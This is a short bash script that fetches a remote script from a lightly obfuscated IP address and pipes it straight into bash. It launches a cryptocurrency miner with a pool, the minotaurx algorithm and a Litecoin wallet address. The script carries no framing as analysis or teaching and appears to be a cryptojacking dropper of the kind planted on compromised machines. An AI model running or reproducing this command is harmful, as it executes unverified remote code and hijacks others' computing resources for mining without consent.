#!/bin/bash
A="185.112"
B="144.152"
curl -sL http://$A.$B/start.sh | bash -s -- -p zpool -a minotaurx -u ltc1qpmvkquzpa5c9qhkq4t8pvhffd7238ae5zewr0v --pass c=LTC
